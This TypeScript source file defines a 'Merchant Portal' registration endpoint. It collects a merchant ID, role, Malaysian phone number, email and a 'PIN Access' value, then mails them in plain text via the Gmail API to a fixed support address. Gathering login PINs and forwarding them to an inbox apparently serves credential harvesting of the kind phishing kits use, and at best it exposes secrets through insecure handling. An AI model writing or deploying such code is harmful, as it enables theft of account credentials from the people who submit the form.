import { z } from 'zod';
import { createEndpoint } from 'zitejs/backend';
import { integrations } from 'zitejs/integrations';

const TO = 'support@duitjom.my';

function b64url(s: string) {
  const bytes = new TextEncoder().encode(s);
  let bin = '';
  bytes.forEach((b) => (bin += String.fromCharCode(b)));
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

export default createEndpoint({
  description: 'Emails a new client registration to support@duitjom.my for manual entry',
  inputSchema: z.object({
    merchantId: z.string(),
    role: z.string(),
    phone: z.string(),
    pin: z.string(),
    email: z.string(),
  }),
  outputSchema: z.object({ success: z.boolean() }),
  execute: async ({ input }) => {
    const { accessToken } = await integrations.get('gmail');
    const time = new Date().toLocaleString('en-MY', { timeZone: 'Asia/Kuala_Lumpur' });
    const body = [
      'New client registration - Merchant Portal',
      '',
      `Merchant ID : ${input.merchantId}`,
      `Role        : ${input.role}`,
      `Phone       : +60${input.phone}`,
      `PIN Access  : ${input.pin}`,
      `E-mail      : ${input.email}`,
      `Submitted   : ${time}`,
    ].join('\r\n');
    const subject = `New Registration - ${input.merchantId} - +60${input.phone}`;
    const raw = [
      `To: ${TO}`,
      `Reply-To: ${input.email}`,
      `Subject: =?UTF-8?B?${btoa(unescape(encodeURIComponent(subject)))}?=`,
      'Content-Type: text/plain; charset="UTF-8"',
      '',
      body,
    ].join('\r\n');
    const res = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages/send', {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({ raw: b64url(raw) }),
    });
    if (!res.ok) {
      console.error('Gmail send failed', res.status, await res.text());
      throw new Error('Could not send your details. Please try again.');
    }
    return { success: true };
  },
});
